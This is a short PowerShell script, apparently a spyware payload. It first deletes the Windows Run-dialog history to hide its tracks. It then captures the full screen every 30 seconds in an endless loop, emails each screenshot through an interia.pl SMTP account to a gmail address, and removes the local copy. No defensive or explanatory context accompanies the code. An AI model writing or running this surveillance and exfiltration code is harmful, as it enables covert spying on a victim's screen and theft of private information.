$SmtpServer = "poczta.interia.pl" ; $SmtpPort = "587"
$secpasswd = ConvertTo-SecureString $Password -AsPlainText -Force
$user = $u + "@interia.pl"
$cred = New-Object System.Management.Automation.PSCredential ($user, $secpasswd)
$Subject = "Screen shocK!"
$To = $T + "@gmail.com"
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
while(1){
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$screens = [Windows.Forms.Screen]::AllScreens
  $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
  $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
  $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
  $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
  $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
  $bmp      = New-Object -TypeName System.Drawing.Bitmap -ArgumentList ([int]$bounds.width), ([int]$bounds.height)
  $graphics = [Drawing.Graphics]::FromImage($bmp)
  $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
  $bmp.Save("$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png")
  $graphics.Dispose()
  $bmp.Dispose()
$Body = "<h3>Screens</h3>" 
$Report = @("$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png")
Send-MailMessage -From $user -to $To -Subject $Subject -Body $Body -SmtpServer $SMTPServer -port $SMTPPort -Credential $cred -UseSsl -BodyAsHtml -Attachments $Report
Remove-Item $env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png
start-sleep -Seconds 30
}
